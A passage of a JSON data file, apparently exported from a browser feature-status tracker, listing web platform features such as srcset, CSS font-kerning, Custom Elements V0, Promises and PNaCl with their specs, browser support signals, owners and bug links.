        "desktop": 34,
        "flag": false,
        "android": 34,
        "bug": "http://code.google.com/p/chromium/issues/detail?id=296891",
        "intervention": false
      },
      "opera": {
        "android": 21,
        "desktop": 21
      },
      "edge": {
        "view": {
          "url": "http://status.modern.ie/imgsrcset?term=srcset",
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "url": "http://trac.webkit.org/changeset/153624",
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "Mixed signals",
          "val": 3
        }
      }
    },
    "summary": "Enable a responsive images solution by providing the browser multiple resources in varying resolutions for a single image.",
    "id": 4644337115725824,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/HTML/Element/img#attr-srcset"
      ]
    }
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2018-04-25 06:28:45.543610",
      "by": "Patket@microsoft.com"
    },
    "name": "CSS font-variant-ligatures",
    "comments": "It's been shipping prefixed for a long time, but broken on HarfBuzz-enabled ports. Usage is minimal.\r\n\r\nIntent to implement: https://groups.google.com/a/chromium.org/forum/#!topic/blink-dev/2-JGOzPEnhU",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 5
      },
      "spec": "http://www.w3.org/TR/css-fonts-3/#font-variant-ligatures-prop",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://developer.mozilla.org/en-US/docs/Web/CSS/font-variant-ligatures",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 34
        },
        "owners": [
          "efidler@blackberry.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 34,
        "ios": 34,
        "blink_components": [
          "Blink"
        ],
        "desktop": 34,
        "flag": false,
        "android": 34,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=22240",
        "intervention": false
      },
      "opera": {
        "android": 21,
        "desktop": 21
      },
      "edge": {
        "view": {
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "A CSS property to control ligatures in text.",
    "id": 5678497057996800,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/CSS/font-variant-ligatures"
      ]
    }
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2017-06-14 18:28:32.757160",
      "by": "ericbidelman@google.com"
    },
    "first_of_milestone": true,
    "name": "CSS font-kerning",
    "comments": "It's been shipping prefixed for a long time, but is broken on HarfBuzz-based ports. Usage is very low.",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 5
      },
      "spec": "http://www.w3.org/TR/css-fonts-3/#font-kerning-prop",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=549861",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 33
        },
        "owners": [
          "efidler@blackberry.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 33,
        "ios": 33,
        "blink_components": [
          "Blink"
        ],
        "desktop": 33,
        "flag": false,
        "android": 33,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=324946",
        "intervention": false
      },
      "opera": {
        "android": 20,
        "desktop": 20
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "A CSS property to control text kerning.",
    "id": 4889527134978048,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/CSS/font-kerning"
      ]
    }
  },
  {
    "category": "Web Components",
    "updated": {
      "when": "2018-02-02 10:11:27.709090",
      "by": "kochi@chromium.org"
    },
    "name": "Custom Elements V0",
    "comments": "Edge's signal should be treated for implementing V1 spec.\r\nFirefox once implemented behind the flag, but removed in favor of V1 APIs.\r\nSafari did not implement Custom Elements V0 spec, but already implemented V1 APIs and shipped it.\r\n\r\n",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 2
      },
      "spec": "http://www.w3.org/TR/custom-elements/",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=856140",
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 33
        },
        "owners": [
          "dominicc@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 33,
        "blink_components": [
          "Blink"
        ],
        "desktop": 33,
        "flag": false,
        "android": 33,
        "bug": "http://crbug.com/180965",
        "intervention": false
      },
      "opera": {
        "android": 20,
        "desktop": 20
      },
      "edge": {
        "view": {
          "url": "http://status.modern.ie/#/",
          "text": "Mixed public signals",
          "val": 4
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Method for registering (creating) custom elements in script.\r\n\r\nThe spec is superceded by Custom Elements V1 and Blink is the only engine that implements V0 APIs.\r\nhttps://www.chromestatus.com/feature/4696261944934400",
    "id": 4642138092470272,
    "resources": {
      "docs": [
        "http://www.html5rocks.com/en/tutorials/webcomponents/customelements/",
        "https://developer.mozilla.org/en-US/docs/Web/Web_Components/Custom_Elements"
      ]
    }
  },
  {
    "category": "Multimedia",
    "updated": {
      "when": "2017-06-14 18:28:32.850760",
      "by": "ericbidelman@google.com"
    },
    "name": "Opus in MSE and <video>",
    "comments": "Opus is a standards supportive, open source codec. It is the MTI codec for WebRTC and has been in chromium since M25. This change enables us to use Opus in MSE and <video> tags for WebM and Matroska containers. The standards body for Matroska has also approved and the spec is attached.",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 4
      },
      "spec": "http://wiki.xiph.org/MatroskaOpus",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=938686",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 33
        },
        "owners": [
          "renganathan@chromium.org",
          "vigneshv@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 33,
        "flag": false,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=315606",
        "intervention": false
      },
      "opera": {
        "android": 21,
        "desktop": 21
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Ability to play the open source WebRTC preferred audio codec - Opus in MSE and <video> tags on the for the webM and matroska containers. Please note that we have had Opus support in chromium since M25. This change enables Opus playback on MSE and <video> tags.",
    "id": 4891189287321600,
    "resources": {}
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2017-08-07 16:43:00.303030",
      "by": "ericbidelman@google.com"
    },
    "name": "Page Visibility API",
    "comments": "First available in Chrome 13, unprefixed in Chrome 33\r\n",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://dvcs.w3.org/hg/webperf/raw-file/tip/specs/PageVisibility/Overview.html",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://developer.mozilla.org/en-US/docs/Mozilla/Firefox/Releases/18#DOM.2FAPIs",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 33
        },
        "owners": [
          "shishir@chromium.org",
          "davidben@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>DOM"
        ],
        "desktop": 33,
        "flag": false,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=230334",
        "intervention": false
      },
      "opera": {
        "android": 20,
        "desktop": 20
      },
      "edge": {
        "view": {
          "url": "http://msdn.microsoft.com/library/ie/hh673553",
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "url": "http://wkrev.com/150695",
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Provides an API to ask whether the current tab is visible or not. If you, you might want to throttle back action or set an idle state.",
    "id": 5689697795833856,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/Guide/User_experience/Using_the_Page_Visibility_API"
      ],
      "samples": [
        "http://simpl.info/pagevisibility"
      ]
    }
  },
  {
    "category": "Multimedia",
    "updated": {
      "when": "2017-06-14 18:29:06.615600",
      "by": "ericbidelman@google.com"
    },
    "name": "VTTCue",
    "comments": "Intent to Implement VTTCue: https://groups.google.com/a/chromium.org/d/msg/blink-dev/-VHGnuNNUxM/Yibbv2TgDoYJ\r\nIntent to Deprecate TextTrackCue constructor: https://groups.google.com/a/chromium.org/d/msg/blink-dev/YJ4SY6WHxso/SJ_f8ZCsExwJ\r\nIntent to Remove TextTrackCue constructor: https://groups.google.com/a/chromium.org/d/msg/blink-dev/R34xpMQGtXU/XwXsi85Y7acJ",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 3
      },
      "spec": "http://dev.w3.org/html5/webvtt/#the-vttcue-interface",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=868509",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 33
        },
        "owners": [
          "philipj@opera.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 33,
        "flag": false,
        "android": 33,
        "bug": "http://code.google.com/p/chromium/issues/detail?id=270340",
        "intervention": false
      },
      "opera": {
        "android": 20,
        "desktop": 20
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "url": "https://bugs.webkit.org/show_bug.cgi?id=122218",
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "The VTTCue interface, part of WebVTT. Previously the members of VTTCue were on the TextTrackCue interface and there was a TextTrackCue constructor, now the VTTCue constructor must be used instead.",
    "id": 5818821692620800,
    "resources": {}
  },
  {
    "category": "Multimedia",
    "updated": {
      "when": "2018-04-25 06:28:19.617090",
      "by": "Patket@microsoft.com"
    },
    "name": "Web Speech API (synthesis)",
    "comments": "Demo: simpl.info/tts",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 1
      },
      "spec": "https://dvcs.w3.org/hg/speech-api/raw-file/tip/speechapi.html",
      "visibility": {
        "text": "Likely in mainstream tech news",
        "val": 1
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "In development",
          "val": 2
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 33
        },
        "owners": [
          "dmazzoni@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 33,
        "flag": false,
        "android": 33,
        "bug": "http://crbug.com/171887",
        "intervention": false
      },
      "opera": {
        "android": 21,
        "desktop": 21
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "url": "http://www.mobilexweb.com/blog/safari-ios7-html5-problems-apis-review",
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Enables web developers to incorporate speech synthesis into their web pages. Uses whatever the platform provides for synthesis.",
    "id": 4782875580825600,
    "resources": {}
  },
  {
    "category": "Misc",
    "updated": {
      "when": "2017-06-14 18:28:35.782820",
      "by": "ericbidelman@google.com"
    },
    "name": "requestAutocomplete()",
    "comments": "https://groups.google.com/a/chromium.org/forum/#!topic/blink-dev/aqKcZkCMsUI\r\n\r\n31: Windows, Chrome OS, Android\r\n33: Mac",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 3
      },
      "spec": "http://whatwg.org/html#dom-form-requestautocomplete",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1018291",
          "text": "Mixed public signals",
          "val": 4
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 33
        },
        "owners": [
          "vinodkr@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 33,
        "flag": false,
        "android": 31,
        "bug": "http://crbug.com/159537",
        "intervention": false
      },
      "opera": {
        "android": 21,
        "desktop": 21
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Allows a form to be filled out on demand by the browser's autofill.  Particularly for mobile applications, this solves the problem of working with long or even multi-page forms.  For merchants, this results in improved conversion rates, sorely needed in mobile purchase scenarios.",
    "id": 5092662981951488,
    "resources": {}
  },
  {
    "category": "Graphics",
    "updated": {
      "when": "2017-06-14 18:28:31.501260",
      "by": "ericbidelman@google.com"
    },
    "first_of_milestone": true,
    "name": "Animated WebP",
    "comments": "From the Intent to Ship: https://groups.google.com/a/chromium.org/forum/#!msg/blink-dev/yujPcy889e4/mGG8JMalprQJ\r\n\r\n\"It's not clear that we are ready to ship Animated WebP... the recommendation of the Blink API Owners is to work on resolving some of these issues with the goal of building more consensus.\"",
    "standards": {
      "status": {
        "text": "Public discussion",
        "val": 5
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://developers.google.com/speed/webp/docs/riff_container",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=600919",
          "text": "Mixed public signals",
          "val": 4
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 32
        },
        "owners": [
          "skonig@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 32,
        "flag": false,
        "android": 32,
        "bug": "http://crbug.com/234777",
        "intervention": false
      },
      "opera": {
        "android": 19,
        "desktop": 19
      },
      "edge": {
        "view": {
          "url": "http://status.modern.ie/webpimageformatsupport",
          "text": "Public skepticism",
          "val": 6
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Support for animated WebP images",
    "id": 4785074604081152,
    "resources": {}
  },
  {
    "category": "Graphics",
    "updated": {
      "when": "2017-06-14 18:29:14.550660",
      "by": "ericbidelman@google.com"
    },
    "name": "Canvas context \"alpha\" attribute",
    "comments": "",
    "standards": {
      "status": {
        "text": "Public discussion",
        "val": 5
      },
      "footprint": {
        "val": 3
      },
      "spec": "http://wiki.whatwg.org/wiki/CanvasOpaque",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=982480",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 32
        },
        "owners": [
          "senorblanco@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 32,
        "flag": false,
        "android": 32,
        "bug": "http://crbug.com/234297",
        "intervention": false
      },
      "opera": {
        "android": 19,
        "desktop": 19
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "Mixed public signals",
          "val": 4
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Allow the specification of a 2D canvas with an opaque backing store (alpha: false). Speeds up compositing. Enables LCD text anti-aliasing.",
    "id": 6454683010859008,
    "resources": {}
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2017-06-14 18:28:52.372110",
      "by": "ericbidelman@google.com"
    },
    "name": "Promises (ES6)",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://people.mozilla.org/~jorendorff/es6-draft.html#sec-promise-objects",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=885333",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 32
        },
        "owners": [
          "yhirano@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 32,
        "flag": false,
        "android": 32,
        "bug": "http://crbug.com/243345",
        "intervention": false
      },
      "opera": {
        "android": 19,
        "desktop": 19
      },
      "edge": {
        "view": {
          "url": "https://dev.modern.ie/platform/status/promiseses6",
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "url": "http://trac.webkit.org/changeset/154629",
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "Mixed signals",
          "val": 3
        }
      }
    },
    "summary": "Using V8 Promises.",
    "id": 5681726336532480,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise",
        "http://www.html5rocks.com/en/tutorials/es6/promises/"
      ]
    }
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2018-04-25 06:25:30.516710",
      "by": "Patket@microsoft.com"
    },
    "name": "URL",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://url.spec.whatwg.org/",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 32
        },
        "owners": [
          "arv@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 32,
        "flag": false,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=303152",
        "intervention": false
      },
      "opera": {
        "android": 19,
        "desktop": 19
      },
      "edge": {
        "view": {
          "url": "https://status.modern.ie/urlapi",
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "url": "https://bugs.webkit.org/show_bug.cgi?id=74385",
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Expose constructible URL objects that can be manipulated and combined.",
    "id": 5675829346435072,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/URL"
      ]
    }
  },
  {
    "category": "Device",
    "updated": {
      "when": "2017-06-14 18:28:55.236480",
      "by": "ericbidelman@google.com"
    },
    "name": "Vibration API",
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 2
      },
      "spec": "http://dev.w3.org/2009/dap/vibration/",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 32
        },
        "owners": [
          "mvanouwerkerk@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 32,
        "flag": false,
        "android": 32,
        "bug": "http://crbug.com/222504",
        "intervention": false
      },
      "opera": {
        "android": 19,
        "desktop": 19
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "Public skepticism",
          "val": 6
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "This specification defines an API that provides access to the vibration mechanism of the hosting device. Vibration is a form of tactile feedback. Note this feature is only available on Android.",
    "id": 5698768766763008,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/Guide/API/Vibration"
      ],
      "samples": [
        "https://googlechrome.github.io/samples/vibration/index.html"
      ]
    }
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2017-10-17 19:29:34.499470",
      "by": "Patket@microsoft.com"
    },
    "first_of_milestone": true,
    "name": "CSS object-fit and object-position",
    "comments": "object-fit landed in M31 http://src.chromium.org/viewvc/blink?view=revision&revision=156535\r\nobject-position landed later: http://src.chromium.org/viewvc/blink?view=revision&revision=158155",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 3
      },
      "spec": "http://dev.w3.org/csswg/css-images-3/#the-object-fit",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://developer.mozilla.org/en-US/docs/Web/CSS/object-fit",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 31
        },
        "owners": [
          "mstensho@opera.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 31,
        "flag": false,
        "bug": "http://crbug.com/236331",
        "intervention": false
      },
      "opera": {
        "android": 18,
        "desktop": 18
      },
      "edge": {
        "view": {
          "url": "https://blogs.windows.com/msedgedev/2017/10/17/edgehtml-16-fall-creators-update/",
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "url": "http://trac.webkit.org/changeset/154858",
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "Strongly positive",
          "val": 1
        }
      }
    },
    "summary": "CSS properties that control the position and size of replaced content within the content box",
    "id": 5302669702856704,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/CSS/object-fit",
        "https://developer.mozilla.org/en-US/docs/Web/CSS/object-position"
      ]
    }
  },
  {
    "category": "Graphics",
    "updated": {
      "when": "2018-04-25 06:23:18.816890",
      "by": "Patket@microsoft.com"
    },
    "name": "Canvas focus ring",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 3
      },
      "spec": "http://www.whatwg.org/specs/web-apps/current-work/multipage/the-canvas-element.html#dom-context-2d-drawsystemfocusring",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=540456",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Behind a flag",
          "val": 4,
          "milestone_str": 31
        },
        "owners": [
          "dmazzoni@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>Accessibility"
        ],
        "desktop": 31,
        "flag": true,
        "android": 31,
        "bug": "http://crbug.com/261998",
        "intervention": false
      },
      "opera": {
        "android": 18,
        "desktop": 18
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "url": "https://bugs.webkit.org/show_bug.cgi?id=132584",
          "text": "In development",
          "val": 2
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Adds APIs to the canvas 2D context that make it possible to draw a focus ring around a canvas path and notify the operating system of the bounding box of the focused object for accessibility.",
    "id": 6413769152397312,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/Canvas_API/Tutorial/Hit_regions_and_accessibility#Focus_rings"
      ]
    }
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2017-06-14 18:28:40.112250",
      "by": "ericbidelman@google.com"
    },
    "name": "DOM3 Wheel Events",
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://dvcs.w3.org/hg/dom3events/raw-file/tip/html/DOM3-Events.html#events-wheelevents",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 31
        },
        "owners": [
          "ch.dumez@sisa.samsung.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 31,
        "flag": false,
        "bug": "http://code.google.com/p/chromium/issues/detail?id=227454",
        "intervention": false
      },
      "opera": {
        "android": 18,
        "desktop": 18
      },
      "edge": {
        "view": {
          "url": "http://samples.msdn.microsoft.com/ietestcenter/#domevents",
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "url": "http://trac.webkit.org/changeset/154673",
          "text": "In development",
          "val": 2
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Implementation of the standard DOM Level 3 WheelEvent. Currently Blink implements a non standard mousewheel event with a very similar but incompatible API.",
    "id": 5388191091654656,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/Events/wheel"
      ]
    }
  },
  {
    "category": "Device",
    "updated": {
      "when": "2017-06-14 18:28:42.312970",
      "by": "ericbidelman@google.com"
    },
    "name": "Device Motion",
    "comments": "Demo: http://simpl.info/dm",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 2
      },
      "spec": "http://dev.w3.org/geo/api/spec-source-orientation.html#devicemotion",
      "visibility": {
        "text": "Likely in mainstream tech news",
        "val": 1
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 31
        },
        "owners": [
          "timvolodine@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 31,
        "flag": false,
        "android": 30,
        "bug": "http://crbug.com/135804",
        "intervention": false
      },
      "opera": {
        "android": 18,
        "desktop": 18
      },
      "edge": {
        "view": {
          "url": "http://msdn.microsoft.com/library/ie/dn323733#device_orientation",
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Provides access to device's physical motion.",
    "id": 5556931766779904,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/Detecting_device_orientation#Processing_motion_events"
      ]
    }
  },
  {
    "category": "Multimedia",
    "updated": {
      "when": "2018-04-25 06:24:03.632960",
      "by": "Patket@microsoft.com"
    },
    "name": "Portable Native Client (PNaCl)",
    "comments": "",
    "standards": {
      "status": {
        "text": "Public discussion",
        "val": 5
      },
      "footprint": {
        "val": 1
      },
      "visibility": {
        "text": "Likely in mainstream tech news",
        "val": 1
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "http://robert.ocallahan.org/2013/05/blink-pnacl-and-standards.html",
          "text": "Opposed",
          "val": 7
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 31
        },
        "owners": [
          "sehr@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 31,
        "flag": false,
        "bug": "http://crbug.com/146958",
        "intervention": false
      },
      "opera": {
        "android": 18,
        "desktop": 18
      },
      "edge": {
        "view": {
          "text": "Opposed",
          "val": 7
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Mixed signals",
          "val": 3
        }
      }
    },
    "summary": "Run C/C++ code compiled to LLVM bitcode on any web page. The code runs inside the Native Client sandbox and has access to the same capabilities as JavaScript via the Pepper APIs.",
    "id": 6193548999262208,
    "resources": {}
  },
  {
    "category": "Device",
    "updated": {
      "when": "2017-06-14 18:28:38.484630",
      "by": "ericbidelman@google.com"
    },
    "name": "devicePixelRatio on zoom",
    "comments": "This does not affect text-zoom, pinch-zoom nor CSS transforms.",
    "standards": {
      "status": {
